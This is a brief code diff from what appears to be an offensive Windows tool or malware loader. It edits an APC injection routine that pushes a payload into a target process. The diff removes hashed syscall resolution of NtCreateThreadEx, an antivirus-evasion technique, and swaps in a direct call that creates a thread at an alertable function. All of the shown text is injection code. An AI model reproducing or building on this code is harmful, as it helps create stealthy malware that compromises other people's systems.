@@ -63,9 +63,7 @@ BOOL ApcInjection(HANDLE hProcess, HANDLE hThread, PBYTE pPayload, SIZE_T sPaylo
         hProcess = NtCurrentProcess();
     }
 
-    NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t)PrepareSyscallHash(NtCreateThreadEx_JOAA);
-
-    NTSTATUS status = pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, &AlertableFunction, NULL, FALSE, 0, 0, 0, NULL);
+    NTSTATUS status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, &AlertableFunction, NULL, FALSE, 0, (SIZE_T)0, (SIZE_T)0, NULL);
     if (status != STATUS_SUCCESS) {
         DebugPrint("[!] NtCreateThreadEx Failed With Error : %d \n", status);
         return FALSE;
